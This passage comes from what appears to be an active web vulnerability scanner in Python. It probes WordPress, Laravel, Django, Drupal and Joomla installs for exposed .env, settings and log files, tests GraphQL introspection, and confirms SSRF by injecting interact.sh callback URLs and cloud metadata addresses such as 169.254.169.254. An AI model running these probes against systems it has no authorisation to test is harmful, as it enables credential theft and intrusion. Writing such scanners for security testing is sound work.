            print(timestamp() + f" [!] WordPress xmlrpc.php accessible: {domain}")

        # /wp-json/wp/v2/users — unauthenticated user enumeration
        status, body, ct = _probe("/wp-json/wp/v2/users")
        if status == 200 and "application/json" in ct.lower():
            try:
                users = json.loads(body)
                if isinstance(users, list) and users:
                    names = [u.get("slug") or u.get("name", "?") for u in users[:5]]
                    alert(
                        "WORDPRESS USER ENUMERATION",
                        "HIGH",
                        base_url + "/wp-json/wp/v2/users",
                        f"REST API returns {len(users)} user record(s) without "
                        f"authentication: {', '.join(str(n) for n in names)}. "
                        f"Disable the users endpoint or restrict to authenticated "
                        f"requests via 'Disable REST API' plugin."
                    )
                    print(timestamp() + f" [!!] WordPress user enum ({len(users)} users): {domain}")
            except Exception:
                pass

        # /wp-content/debug.log
        status, body, ct = _probe("/wp-content/debug.log")
        if status == 200 and (
            "php" in body.lower() or "error" in body.lower()
            or "warning" in body.lower() or "notice" in body.lower()
        ):
            alert(
                "WORDPRESS DEBUG LOG EXPOSED",
                "HIGH",
                base_url + "/wp-content/debug.log",
                "WordPress debug.log is publicly accessible — contains PHP errors, "
                "file system paths, database query errors, and stack traces that "
                "assist targeted exploitation. Remove or restrict with nginx/Apache rules."
            )
            print(timestamp() + f" [!!] WordPress debug.log accessible: {domain}")

    # ── Laravel ───────────────────────────────────────────────────────────────
    if "Laravel" in tech_set:
        # /storage/logs/laravel.log
        status, body, ct = _probe("/storage/logs/laravel.log")
        if status == 200 and (
            "[" in body and (
                "laravel" in body.lower() or "exception" in body.lower()
                or "error" in body.lower() or "stack trace" in body.lower()
            )
        ):
            alert(
                "LARAVEL LOG FILE EXPOSED",
                "HIGH",
                base_url + "/storage/logs/laravel.log",
                "Laravel application log is publicly accessible — may contain "
                "stack traces, file system paths, SQL queries, environment details, "
                "and session tokens. Restrict the /storage/ directory in the web server."
            )
            print(timestamp() + f" [!!] Laravel laravel.log exposed: {domain}")

        # /.env — checked here in addition to the generic check_env_exposure
        # for a Laravel-specific body confirmation
        status, body, ct = _probe("/.env")
        if status == 200 and any(k in body for k in ("APP_KEY", "DB_PASSWORD", "DB_HOST",
                                                       "MAIL_PASSWORD", "AWS_SECRET")):
            alert(
                "LARAVEL ENV FILE EXPOSED",
                "CRITICAL",
                base_url + "/.env",
                ".env configuration file is publicly accessible — contains APP_KEY "
                "(used for encryption/signing), database credentials, mail server "
                "passwords, and third-party API keys. Rotate all secrets immediately "
                "and restrict the file via web server configuration."
            )
            print(timestamp() + f" [!!] Laravel .env exposed: {domain}")

        # /telescope — Laravel Telescope debug dashboard
        status, body, ct = _probe("/telescope")
        if status == 200 and not catch_all and (
            "telescope" in body.lower() or "laravel" in body.lower()
        ):
            alert(
                "LARAVEL TELESCOPE EXPOSED",
                "HIGH",
                base_url + "/telescope",
                "Laravel Telescope dashboard is accessible without authentication — "
                "exposes full HTTP request/response history, SQL queries, queued jobs, "
                "cache operations, and exception details. Restrict to local env or "
                "add gate() authorization in TelescopeServiceProvider."
            )
            print(timestamp() + f" [!!] Laravel Telescope exposed: {domain}")

        # /horizon — Laravel Horizon queue dashboard
        status, body, ct = _probe("/horizon")
        if status == 200 and not catch_all and (
            "horizon" in body.lower() or "laravel" in body.lower()
            or "queue" in body.lower()
        ):
            alert(
                "LARAVEL HORIZON EXPOSED",
                "HIGH",
                base_url + "/horizon",
                "Laravel Horizon dashboard is accessible without authentication — "
                "exposes queue worker configuration, failed job history, throughput "
                "metrics, and job payload data. Add gate() authorization in "
                "HorizonServiceProvider."
            )
            print(timestamp() + f" [!!] Laravel Horizon exposed: {domain}")

        # Debug mode — probe a nonexistent path and check for Whoops/Ignition
        rand_path = f"/debug-probe-{random.randint(10000, 99999)}"
        status, body, ct = _probe(rand_path)
        if "whoops" in body.lower() or "ignition" in body.lower() \
                or ("stack trace" in body.lower() and "laravel" in body.lower()):
            alert(
                "LARAVEL DEBUG MODE ENABLED",
                "HIGH",
                base_url,
                "Laravel debug mode (APP_DEBUG=true) is active in production — "
                "Whoops/Ignition error pages expose full stack traces, source file "
                "contents, request variables, and environment configuration on "
                "unhandled exceptions. Set APP_DEBUG=false in .env."
            )
            print(timestamp() + f" [!!] Laravel debug mode detected: {domain}")

    # ── Spring Boot ───────────────────────────────────────────────────────────
    # Actuator endpoint probing is already handled by check_actuator_exposure
    # (which runs unconditionally in _exposure_tasks). Here we only confirm
    # that the Whitelabel error page is present as a secondary signal.
    if "Spring Boot" in tech_set:
        rand_path = f"/spring-probe-{random.randint(10000, 99999)}"
        status, body, ct = _probe(rand_path)
        if "whitelabel error page" in body.lower():
            print(timestamp() + f" [*] Spring Boot Whitelabel error page confirmed: {domain}")
            write_to_tech_database(base_url, "Spring Boot (Whitelabel confirmed)")

    # ── Django ────────────────────────────────────────────────────────────────
    if "Django" in tech_set:
        # Trigger a 404 on a nonexistent path and check for the debug page
        rand_path = f"/django-probe-{random.randint(10000, 99999)}"
        status, body, ct = _probe(rand_path)
        if status == 404 and (
            "using the urlconf" in body.lower()
            or "django tried these url patterns" in body.lower()
            or ("debugtoolbar" in body.lower())
        ):
            ver_m = re.search(r'django[/ ](\d+\.\d+)', body, re.I)
            ver_str = f" (Django {ver_m.group(1)})" if ver_m else ""
            alert(
                "DJANGO DEBUG MODE ENABLED",
                "HIGH",
                base_url,
                f"Django debug mode is active in production{ver_str} — the 404 "
                f"debug page exposes all configured URL patterns, installed apps, "
                f"Django and Python versions. Set DEBUG=False in settings.py."
            )
            print(timestamp() + f" [!!] Django debug mode detected: {domain}")

        # /admin/
        status, body, ct = _probe("/admin/")
        if status == 200 and not catch_all and (
            "django" in body.lower() or "log in" in body.lower()
            or "password" in body.lower()
        ):
            alert(
                "DJANGO ADMIN PANEL ACCESSIBLE",
                "MEDIUM",
                base_url + "/admin/",
                "Django admin panel is publicly accessible. Verify it is protected "
                "by strong credentials and is not exposed to the public internet; "
                "consider restricting by IP via web server configuration."
            )
            print(timestamp() + f" [!] Django /admin/ accessible: {domain}")

        # Django Debug Toolbar /__debug__/
        status, body, ct = _probe("/__debug__/")
        if status == 200 and not catch_all:
            alert(
                "DJANGO DEBUG TOOLBAR EXPOSED",
                "MEDIUM",
                base_url + "/__debug__/",
                "Django Debug Toolbar endpoint is publicly accessible — may expose "
                "SQL query history, request context, settings values, and template "
                "context. Remove django-debug-toolbar from INSTALLED_APPS in production."
            )
            print(timestamp() + f" [!] Django Debug Toolbar /__debug__/ exposed: {domain}")

    # ── Ruby on Rails ─────────────────────────────────────────────────────────
    if "Ruby on Rails" in tech_set:
        # /rails/info/properties
        status, body, ct = _probe("/rails/info/properties")
        if status == 200 and (
            "ruby" in body.lower() or "rails" in body.lower()
            or "middleware" in body.lower()
        ):
            alert(
                "RAILS INFO PROPERTIES EXPOSED",
                "HIGH",
                base_url + "/rails/info/properties",
                "/rails/info/properties is publicly accessible — exposes Ruby and "
                "Rails version numbers, loaded middleware stack, and route information. "
                "Restrict in production: config.consider_all_requests_local = false"
            )
            print(timestamp() + f" [!!] Rails /rails/info/properties exposed: {domain}")

        # /rails/mailers
        status, body, ct = _probe("/rails/mailers")
        if status == 200 and not catch_all and (
            "mailer" in body.lower() or "preview" in body.lower()
        ):
            alert(
                "RAILS MAILERS PREVIEW EXPOSED",
                "MEDIUM",
                base_url + "/rails/mailers",
                "Action Mailer preview endpoint is publicly accessible — exposes "
                "email template content and internal mailer configuration. "
                "Restrict via show_previews config or IP allowlist."
            )
            print(timestamp() + f" [!] Rails /rails/mailers exposed: {domain}")

    # ── Drupal ────────────────────────────────────────────────────────────────
    if "Drupal" in tech_set:
        # /CHANGELOG.txt — version disclosure
        status, body, ct = _probe("/CHANGELOG.txt")
        if status == 200 and "drupal" in body[:200].lower():
            ver_m = re.search(r'drupal\s+(\d+\.\d+[\.\d]*)', body, re.I)
            ver_str = f" ({ver_m.group(0)})" if ver_m else ""
            alert(
                "DRUPAL VERSION DISCLOSURE",
                "LOW",
                base_url + "/CHANGELOG.txt",
                f"CHANGELOG.txt is publicly accessible{ver_str} — discloses the "
                f"exact Drupal version, enabling targeted lookup of known CVEs. "
                f"Remove this file or deny access via web server configuration."
            )
            print(timestamp() + f" [!] Drupal CHANGELOG.txt accessible: {domain}")

        # /sites/default/settings.php
        status, body, ct = _probe("/sites/default/settings.php")
        if status == 200 and (
            "database" in body.lower() or "$databases" in body
            or "$db_url" in body or "drupal" in body.lower()
        ):
            alert(
                "DRUPAL SETTINGS FILE EXPOSED",
                "CRITICAL",
                base_url + "/sites/default/settings.php",
                "Drupal settings.php is publicly readable — contains database "
                "credentials, trusted_host_patterns, and installation-specific "
                "configuration. Fix file permissions (chmod 440 or 444)."
            )
            print(timestamp() + f" [!!] Drupal settings.php exposed: {domain}")

        # /admin/
        status, body, ct = _probe("/admin/")
        if status == 200 and not catch_all and (
            "drupal" in body.lower() or "log in" in body.lower()
            or "administer" in body.lower()
        ):
            alert(
                "DRUPAL ADMIN PANEL ACCESSIBLE",
                "MEDIUM",
                base_url + "/admin/",
                "Drupal admin panel is publicly accessible. Verify it is protected "
                "by strong credentials and not reachable from the public internet."
            )
            print(timestamp() + f" [!] Drupal /admin/ accessible: {domain}")

    # ── Joomla ────────────────────────────────────────────────────────────────
    if "Joomla" in tech_set:
        # /administrator/
        status, body, ct = _probe("/administrator/")
        if status == 200 and not catch_all and (
            "joomla" in body.lower() or "administrator" in body.lower()
            or "password" in body.lower()
        ):
            alert(
                "JOOMLA ADMIN PANEL ACCESSIBLE",
                "MEDIUM",
                base_url + "/administrator/",
                "Joomla administrator panel is publicly accessible. Consider "
                "restricting access by IP address and enabling two-factor "
                "authentication in Joomla's user management settings."
            )
            print(timestamp() + f" [!] Joomla /administrator/ accessible: {domain}")

        # /configuration.php.bak
        status, body, ct = _probe("/configuration.php.bak")
        if status == 200 and (
            "joomla" in body.lower() or "secret" in body.lower()
            or "db_host" in body.lower() or "public $db" in body.lower()
        ):
            alert(
                "JOOMLA CONFIGURATION BACKUP EXPOSED",
                "CRITICAL",
                base_url + "/configuration.php.bak",
                "Joomla configuration.php.bak is publicly accessible — contains "
                "database credentials, secret key, FTP credentials, and full "
                "application configuration. Delete this file immediately."
            )
            print(timestamp() + f" [!!] Joomla configuration.php.bak exposed: {domain}")

        # /README.txt — version disclosure
        status, body, ct = _probe("/README.txt")
        if status == 200 and "joomla" in body.lower():
            ver_m = re.search(r'joomla[!]?\s+(\d+\.\d+[\.\d]*)', body, re.I)
            ver_str = f" ({ver_m.group(0)})" if ver_m else ""
            alert(
                "JOOMLA VERSION DISCLOSURE",
                "LOW",
                base_url + "/README.txt",
                f"README.txt is publicly accessible{ver_str} — discloses the Joomla "
                f"version, aiding targeted exploitation of known CVEs. "
                f"Remove this file from production."
            )
            print(timestamp() + f" [!] Joomla README.txt accessible: {domain}")


# ─────────────────────────────────────────────
# GraphQL introspection detection
# ─────────────────────────────────────────────

GRAPHQL_PATHS = [
    "/graphql", "/graphql/", "/api/graphql", "/api/graphql/",
    "/v1/graphql", "/v2/graphql", "/query", "/gql",
    "/graphiql", "/playground",
]

GRAPHQL_INTROSPECTION_QUERY = '{"query":"{__schema{types{name fields{name}}}}"}'

GRAPHQL_INTROSPECTION_INDICATORS = [
    "__schema", "__typename", "queryType", "mutationType",
    "types", "directives",
]

_graphql_checked    = set()
_graphql_url_probed = set()   # dedup for per-page URL probing

# Error messages returned when introspection is present but explicitly disabled.
_GRAPHQL_DISABLED_INDICATORS = [
    "introspection is disabled",
    "IntrospectionDisabled",
    "GraphQL introspection is not allowed",
    "not allowed to run introspection queries",
    "Introspection queries are not allowed",
    "introspection not allowed",
    "introspection has been disabled",
]

# URL path fragments that suggest a GraphQL endpoint
_GRAPHQL_PATH_HINTS = ("graphql", "graph", "/api")

def _probe_graphql_endpoint(url, domain):
    """
    Send an introspection query to a single URL and return the verdict:
      'enabled'  — schema data confirmed (HIGH)
      'disabled' — endpoint exists but introspection is off (MEDIUM)
      None       — not a GraphQL endpoint or no response
    """
    try:
        stealth_delay(domain)
        resp = _get_session().post(
            url,
            data=GRAPHQL_INTROSPECTION_QUERY,
            headers={**create_request_header(), "Content-Type": "application/json"},
            timeout=6,
            allow_redirects=False,
        )
        if resp.status_code not in (200, 201, 400):
            return None
        body = resp.text
        ct   = resp.headers.get("Content-Type", "")

        # Check for introspection-disabled error first (often a 400 or 200 with error body)
        if any(ind.lower() in body.lower() for ind in _GRAPHQL_DISABLED_INDICATORS):
            return "disabled"

        if resp.status_code not in (200, 201):
            return None
        if "json" not in ct and "__schema" not in body:
            return None

        matched = [ind for ind in GRAPHQL_INTROSPECTION_INDICATORS if ind in body]
        if len(matched) >= 2:
            return "enabled"
    except Exception as e:
        print_error(f"GraphQL probe failed for {url}: {e}")
    return None


def probe_graphql_url(page_url):
    """
    Called per crawled page. If the URL path contains a GraphQL hint
    ('graphql', 'graph', '/api'), probe that specific URL with an
    introspection query. Deduplicates via _graphql_url_probed.
    """
    try:
        parsed = urlparse(page_url)
        path   = parsed.path.lower()
        if not any(hint in path for hint in _GRAPHQL_PATH_HINTS):
            return
        probe_url = parsed.scheme + "://" + parsed.netloc + parsed.path
        if probe_url in _graphql_url_probed:
            return
        _graphql_url_probed.add(probe_url)

        domain = parsed.netloc
        verdict = _probe_graphql_endpoint(probe_url, domain)
        if verdict == "enabled":
            type_count = 0
            try:
                resp = _get_session().post(
                    probe_url,
                    data=GRAPHQL_INTROSPECTION_QUERY,
                    headers={**create_request_header(), "Content-Type": "application/json"},
                    timeout=6,
                    allow_redirects=False,
                )
                type_count = resp.text.count('"name"')
            except Exception:
                pass
            alert(
                "GRAPHQL INTROSPECTION ENABLED",
                "HIGH",
                probe_url,
                f"Full API schema exposed at crawled endpoint — {type_count} name fields visible"
            )
            print(timestamp() + f" [!!] GraphQL introspection enabled: {probe_url}")
        elif verdict == "disabled":
            alert(
                "GRAPHQL ENDPOINT FOUND: INTROSPECTION DISABLED",
                "MEDIUM",
                probe_url,
                f"GraphQL endpoint exists at {probe_url} but introspection is disabled — "
                f"API is present, manual probing may still be possible"
            )
            print(timestamp() + f" [!] GraphQL endpoint (introspection disabled): {probe_url}")
    except Exception as e:
        print_error(f"probe_graphql_url failed for {page_url}: {e}")


def check_graphql_introspection(base_url, domain):
    """
    Probe common GraphQL paths on a host and test whether introspection is enabled.
    Introspection in production exposes the full API schema to unauthenticated
    attackers. Alerts HIGH when confirmed, MEDIUM when endpoint exists but
    introspection is explicitly disabled.
    Only called when --active-probes is enabled.
    """
    if domain in _graphql_checked:
        return
    _graphql_checked.add(domain)

    for path in GRAPHQL_PATHS:
        url = base_url.rstrip("/") + path
        if url in _graphql_url_probed:
            continue   # already probed by per-page path check
        _graphql_url_probed.add(url)

        verdict = _probe_graphql_endpoint(url, domain)
        if verdict == "enabled":
            try:
                resp = _get_session().post(
                    url,
                    data=GRAPHQL_INTROSPECTION_QUERY,
                    headers={**create_request_header(), "Content-Type": "application/json"},
                    timeout=6,
                    allow_redirects=False,
                )
                type_count = resp.text.count('"name"')
            except Exception:
                type_count = 0
            alert(
                "GRAPHQL INTROSPECTION ENABLED",
                "HIGH",
                url,
                f"Full API schema exposed — {type_count} name fields visible"
            )
            print(timestamp() + f" [!!] GraphQL introspection enabled: {url}")
            return   # one confirmed endpoint is enough to alert per host
        elif verdict == "disabled":
            alert(
                "GRAPHQL ENDPOINT FOUND: INTROSPECTION DISABLED",
                "MEDIUM",
                url,
                f"GraphQL endpoint exists at {url} but introspection is disabled — "
                f"API is present, manual probing may still be possible"
            )
            print(timestamp() + f" [!] GraphQL endpoint (introspection disabled): {url}")


# ─────────────────────────────────────────────
# SSRF candidate parameter flagging
# ─────────────────────────────────────────────

# Parameter names that commonly accept URLs or remote resources.
# Presence of these on an auth-gated or server-side endpoint is an SSRF risk.
SSRF_PARAM_NAMES = {
    "url", "uri", "redirect", "callback", "return", "returnurl", "return_url",
    "returnto", "return_to", "next", "target", "dest", "destination",
    "go", "goto", "link", "src", "source", "ref", "referrer", "image",
    "img", "proxy", "fetch", "load", "remote", "endpoint", "service",
    "webhook", "notify", "ping", "host", "site", "feed", "data",
    "path", "file", "open", "domain", "port", "to", "from",
}

_ssrf_flagged = set()    # domains already collected (prevents re-scanning the same domain)

# Stores candidates found by flag_ssrf_candidates for consumption by check_ssrf_oob.
# Maps page_url → (frozenset of param names, waf_vendor_or_None)
_ssrf_candidates: dict = {}


def flag_ssrf_candidates(page_url, html_content):
    """
    Scan page links and form inputs for URL-accepting parameter names and
    store them in _ssrf_candidates for OOB confirmation by check_ssrf_oob.

    Does NOT fire any alerts — alerting is deferred to check_ssrf_oob so
    that every finding is backed by an OOB confirmation attempt.
    Does not make any HTTP requests.
    """
    domain = urlparse(page_url).netloc
    if domain in _ssrf_flagged:
        return
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    found = set()

    # Query params from all hrefs/actions on the page
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            try:
                parsed = urlparse(href)
                for pair in (parsed.query or "").split("&"):
                    if "=" in pair:
                        k, _ = pair.split("=", 1)
                        if k.lower() in SSRF_PARAM_NAMES:
                            found.add(k.lower())
            except Exception:
                pass

    # Also check the current page URL's own params
    try:
        parsed = urlparse(page_url)
        for pair in (parsed.query or "").split("&"):
            if "=" in pair:
                k, _ = pair.split("=", 1)
                if k.lower() in SSRF_PARAM_NAMES:
                    found.add(k.lower())
    except Exception:
        pass

    # Form input names
    for inp in soup.find_all("input"):
        name = (inp.get("name") or "").lower()
        if name in SSRF_PARAM_NAMES:
            found.add(name)

    if found:
        _ssrf_flagged.add(domain)
        waf = _response_waf_provider_from_text(text)
        _ssrf_candidates[page_url] = (frozenset(found), waf)
        print(timestamp() + f" SSRF candidates queued on {domain}: "
              f"{', '.join(sorted(found))}"
              + (f" [WAF: {waf}]" if waf else ""))


# ─────────────────────────────────────────────
# SSRF OOB confirmation (interact.sh HTTP API)
# ─────────────────────────────────────────────

_INTERACTSH_SERVER = "https://oast.pro"
# Set True once HTTP registration with interact.sh succeeds at startup
_INTERACTSH_AVAILABLE = False

# Session-scoped OOB state (one instance per process, shared across domains)
# When registered: dict with correlation_id, secret_key, private_key
# Before registration / on failure: None
_ssrf_oob_client: object = None
_ssrf_oob_base_url: str  = ""
_ssrf_oob_tried: bool    = False   # prevents repeated registration attempts

# Per-domain dedup — (base_url, param) pairs already OOB-probed
_ssrf_tested: set = set()

# Cloud metadata probe table — (url, indicators, label)
# Paths are safe/non-sensitive: they confirm reachability only, not credentials.
_SSRF_CLOUD_PROBES: list = [
    ("http://169.254.169.254/latest/meta-data/",
     ["ami-id", "instance-id", "instance-type", "local-ipv4"],
     "AWS IMDSv1"),
    ("http://169.254.169.254/latest/api/token",
     ["EC2-IMDS", "instance-id"],
     "AWS IMDSv2 token endpoint"),
    ("http://metadata.google.internal/computeMetadata/v1/",
     ["computeMetadata", "instance-id", "serviceAccounts"],
     "GCP Metadata"),
    ("http://169.254.169.254/metadata/instance",
     ["azureMetadata", "vmId", "subscriptionId", "instance-id"],
     "Azure IMDS"),
]


def _ssrf_init_oob_client() -> tuple:
    """
    Register a session with the interact.sh HTTP API for OOB SSRF detection.
    Returns (session_dict, oob_domain) on success, or (None, "") on failure.
    The OOB domain is built as <correlation-id>.interact.sh.
    Only attempts registration once per process; returns cached result thereafter.
    """
    global _ssrf_oob_client, _ssrf_oob_base_url, _INTERACTSH_AVAILABLE, _ssrf_oob_tried
    if _ssrf_oob_client is not None:
        return _ssrf_oob_client, _ssrf_oob_base_url
    if _ssrf_oob_tried:
        return None, ""
    _ssrf_oob_tried = True
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
        from cryptography.hazmat.primitives import serialization as _serial
        # Generate RSA-2048 key pair — interact.sh uses it to encrypt the AES key
        # that protects poll responses.
        private_key = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
        pub_der = private_key.public_key().public_bytes(
            encoding=_serial.Encoding.DER,
            format=_serial.PublicFormat.SubjectPublicKeyInfo,
        )
        corr_id    = secrets.token_hex(10)       # 20-char hex correlation-id
        secret_key = secrets.token_urlsafe(16)
        resp = requests.post(
            f"{_INTERACTSH_SERVER}/api/v1/register",
            json={
                "public-key":     base64.b64encode(pub_der).decode(),
                "secret-key":     secret_key,
                "correlation-id": corr_id,
            },
            timeout=10,
        )
        if resp.status_code not in (200, 201):
            print(timestamp() + f" [SSRF] interact.sh registration failed: "
                  f"HTTP {resp.status_code} — blind fallback active")
            return None, ""
        oob_domain = f"{corr_id}.interact.sh"
        session = {
            "correlation_id": corr_id,
            "secret_key":     secret_key,
            "private_key":    private_key,
        }
        _ssrf_oob_client   = session
        _ssrf_oob_base_url = oob_domain
        _INTERACTSH_AVAILABLE = True
        print(timestamp() + f" [SSRF] OOB client registered: {oob_domain}")
        return session, oob_domain
    except Exception as exc:
        print(timestamp() + f" [SSRF] interact.sh registration failed "
              f"({str(exc)[:80]}) — blind fallback active")
        return None, ""


def _ssrf_poll_interactions(client, timeout_s: int = 10) -> list:
    """
    Poll interact.sh GET /api/v1/poll for up to *timeout_s* seconds, checking
    every second.  Returns a list of interaction dicts (may be empty on timeout).
    Each dict contains at least: protocol, remote-address.

    interact.sh encrypts poll responses: the AES key is RSA-OAEP encrypted with
    the client's public key; each interaction item is AES-CFB(IV||ciphertext).
    """
    if client is None:
        return []
    from cryptography.hazmat.primitives.asymmetric import padding as _pad
    from cryptography.hazmat.primitives import hashes as _hashes
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    corr_id     = client["correlation_id"]
    secret_key  = client["secret_key"]
    private_key = client["private_key"]

    deadline = time.monotonic() + timeout_s
    while time.monotonic() < deadline:
        try:
            resp = requests.get(
                f"{_INTERACTSH_SERVER}/api/v1/poll",
                params={"id": corr_id, "secret": secret_key},
                timeout=10,
            )
            if resp.status_code == 200:
                body        = resp.json()
                raw_items   = body.get("data") or []
                aes_key_b64 = body.get("aes_key", "")
                if raw_items and aes_key_b64:
                    # Decrypt the per-session AES key with our RSA private key
                    aes_key = private_key.decrypt(
                        base64.b64decode(aes_key_b64),
                        _pad.OAEP(
                            mgf=_pad.MGF1(algorithm=_hashes.SHA256()),
                            algorithm=_hashes.SHA256(),
                            label=None,
                        ),
                    )
                    interactions = []
                    for item in raw_items:
                        try:
                            raw = base64.b64decode(item)
                            iv, ciphertext = raw[:16], raw[16:]
                            dec = Cipher(algorithms.AES(aes_key), modes.CFB(iv)).decryptor()
                            plain = dec.update(ciphertext) + dec.finalize()
                            interactions.append(json.loads(plain))
                        except Exception:
                            pass
                    if interactions:
                        return interactions
        except Exception:
            pass
        time.sleep(1)
    return []


def _ssrf_resolve_target_ip(url: str) -> str:
    """Return the IPv4 address of *url*'s hostname, or "" on failure."""
    try:
        host = urlparse(url).hostname or ""
        return socket.gethostbyname(host) if host else ""
    except Exception:
        return ""


def _ssrf_classify_interaction(interactions: list, target_ip: str) -> tuple:
    """
    Classify a set of OOB interactions.
    Returns (confirmed: bool, severity: str, detail: str).

    HIGH  — at least one interaction came from the target server's own IP.
    MEDIUM — interaction received but source IP is unexpected (CDN / DNS resolver).
    """
    if not interactions:
        return False, "", ""

    protos  = [str(i.get("protocol", "")).lower() for i in interactions if i.get("protocol")]
    src_ips = [str(i.get("remote-address", "")).split(":")[0] for i in interactions]
    proto_s = "/".join(sorted(set(p for p in protos if p))) or "unknown"
    ip_s    = ", ".join(sorted(set(i for i in src_ips if i))) or "unknown"

    direct = bool(target_ip and any(ip == target_ip for ip in src_ips if ip))

    if direct:
        return True, "HIGH", (
            f"OOB {proto_s.upper()} interaction received from target IP {target_ip} "
            f"— SSRF is directly exploitable."
        )
    return True, "MEDIUM", (
        f"OOB {proto_s.upper()} interaction received from {ip_s} "
        f"— source does not match target IP {target_ip or '(unresolved)'}; "
        f"may be CDN/DNS resolver. Manual confirmation required."
    )


def _ssrf_check_cloud_metadata(
    base: str, param: str, params: dict, domain: str
) -> None:
    """
    Inject cloud metadata URLs into a confirmed SSRF parameter and check whether
    the server reflects metadata indicators in the response body.

    Only called after OOB SSRF confirmation.
    Uses safe/non-sensitive metadata paths — no IAM credential paths are accessed.
    """
    for meta_url, indicators, cloud_label in _SSRF_CLOUD_PROBES:
        new_query = "&".join(
            f"{k}={meta_url}" if k == param else f"{k}={v}"
            for k, v in params.items()
        )
        test_url = base + "?" + new_query
        try:
            stealth_delay(domain)
            resp    = _get_session().get(
                test_url,
                headers=create_request_header(),
                timeout=10,
                allow_redirects=True,
            )
            body    = resp.text or ""
            matched = [ind for ind in indicators if ind.lower() in body.lower()]
            if matched:
                alert(
                    "SSRF: CLOUD METADATA ACCESSIBLE",
                    "CRITICAL",
                    test_url,
                    f"SSRF-confirmed parameter '{param}' on {base} returned "
                    f"{cloud_label} indicators: {matched!r}. "
                    f"Full IAM credential exposure may be possible via "
                    f"/latest/meta-data/iam/security-credentials/. "
                    f"Payload: {meta_url!r}",
                )
                print(timestamp() + f" [!!!] SSRF cloud metadata ({cloud_label}) at {base}")
                return   # one confirmed cloud provider is enough
        except Exception:
            pass


def check_ssrf_oob(page_url: str, html_content) -> None:
    """
    OOB-confirmed SSRF detection using the interact.sh HTTP API.

    Reads candidates stored by flag_ssrf_candidates (which runs unconditionally
    earlier in the crawl loop) and runs OOB confirmation for each one.  This
    unified flow means every SSRF alert is backed by an actual probe result —
    no premature MEDIUM alerts are fired before confirmation is attempted.

    Severity after OOB:
      HIGH   — OOB interaction received from the target server's own IP.
      MEDIUM — OOB interaction received from unexpected IP (CDN/resolver),
               OR no OOB interaction but OOB client is available (candidate
               needs manual verification).
      MEDIUM — WAF detected: OOB interaction may have been blocked; noted
               in detail.
      MEDIUM — interact.sh registration failed (blind fallback — manual
               verification required).

    OOB-confirmed endpoints are additionally probed for cloud metadata
    (AWS/GCP/Azure IMDS).  CRITICAL if metadata indicators appear in the
    response body.

    Only called when --active-probes is enabled.
    Deduplicates per (base_url, param) pair.
    10-second request timeout + 10-second polling window per probe.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    # ── Read candidates queued by flag_ssrf_candidates ────────────────────────
    # flag_ssrf_candidates stores by page_url; collect any entries for this page.
    candidate_params, page_waf = _ssrf_candidates.get(page_url, (frozenset(), None))

    # Also pick up candidates stored under the base URL (no query string)
    parsed_page = urlparse(page_url)
    base_page   = parsed_page.scheme + "://" + parsed_page.netloc + parsed_page.path
    if base_page != page_url and base_page in _ssrf_candidates:
        bp_params, bp_waf = _ssrf_candidates[base_page]
        candidate_params = candidate_params | bp_params
        page_waf = page_waf or bp_waf

    # Build (base, param, params_dict) probing tuples from the page URL's query
    candidates: list[tuple[str, str, dict]] = []
    if candidate_params and parsed_page.query:
        params_map: dict = {}
        for pair in parsed_page.query.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params_map[k] = v
        base = base_page
        for k in params_map:
            if k.lower() in candidate_params:
                key = (base, k)
                if key not in _ssrf_tested:
                    candidates.append((base, k, params_map))
    elif candidate_params:
        # Params were found on linked URLs / form inputs — use page_url as base
        # with an empty params dict so we can still run OOB probes.
        base = base_page
        for param in candidate_params:
            key = (base, param)
            if key not in _ssrf_tested:
                candidates.append((base, param, {param: ""}))

    if not candidates:
        return

    # ── Setup OOB client (lazy; reused for the entire scan session) ───────────
    oob_client, oob_url = _ssrf_init_oob_client()
    oob_available = oob_client is not None and bool(oob_url)

    target_ip = _ssrf_resolve_target_ip(page_url)

    # WAF note: prefer live WAF detection result, fall back to what flag_ssrf_candidates saw
    waf_vendor = _waf_results.get(domain) or page_waf
    waf_note   = f" [WAF: {waf_vendor} detected — OOB interaction may have been blocked]" \
                 if waf_vendor else ""

    for base, param, params in candidates:
        key = (base, param)
        if key in _ssrf_tested:
            continue
        _ssrf_tested.add(key)

        print(timestamp() + f" SSRF OOB probe: {base} param={param}")

        if not oob_available:
            # ── Blind fallback — fire MEDIUM so the finding isn't silently dropped ──
            alert(
                "SSRF CANDIDATE (OOB UNAVAILABLE)",
                "MEDIUM",
                base,
                f"Parameter '{param}' on {base} accepts URLs. "
                f"OOB detection unavailable — interact.sh registration failed "
                f"at startup. Manual verification required.{waf_note}",
            )
            continue

        # ── OOB probes ────────────────────────────────────────────────────────
        oob_payloads = [
            f"http://{oob_url}",
            f"https://{oob_url}",
            f"http://{oob_url}/ssrf-probe-2a1f",
        ]
        for payload in oob_payloads:
            new_query = "&".join(
                f"{k}={payload}" if k == param else f"{k}={v}"
                for k, v in params.items()
            )
            try:
                stealth_delay(domain)
                _get_session().get(
                    base + "?" + new_query,
                    headers=create_request_header(),
                    timeout=10,
                    allow_redirects=True,
                )
            except Exception:
                pass

        # ── Poll for interactions ─────────────────────────────────────────────
        print(timestamp() + f" [SSRF] Polling OOB (10s) for {base} param={param} ...")
        interactions = _ssrf_poll_interactions(oob_client, timeout_s=10)
        confirmed, sev, oob_detail = _ssrf_classify_interaction(interactions, target_ip)

        if confirmed:
            proto_s = "/".join(sorted(set(
                str(i.get("protocol", "")).upper()
                for i in interactions if i.get("protocol")
            ))) or "OOB"
            alert(
                f"SSRF CONFIRMED ({proto_s} INTERACTION)",
                sev,
                base,
                f"Parameter '{param}' on {base} triggered OOB callback. "
                f"{oob_detail} Payload: {oob_payloads[0]!r}{waf_note}",
            )
            if sev == "HIGH":
                print(timestamp() + f" [!!] SSRF confirmed (direct OOB) at {base} param={param}")
            else:
                print(timestamp() + f" [!] SSRF likely (OOB, unexpected IP) at {base} param={param}")

            # Cloud metadata probe only for confirmed endpoints
